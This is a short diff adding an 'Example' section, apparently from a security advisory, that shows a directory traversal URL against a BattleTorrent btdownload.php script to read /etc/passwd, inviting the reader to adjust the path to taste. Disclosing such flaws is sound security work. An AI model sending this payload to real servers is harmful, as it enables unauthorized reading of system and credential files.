@@ -1,0 +1,7 @@
+
+Example
+-------
+  The following URL can be used to download a file:
+   htp://example.org/battletorrent/btdownload.php?type=torrent&file=../../etc/passwd
+  (Adjust the ".."'s and the filename to suit your taste).
+     
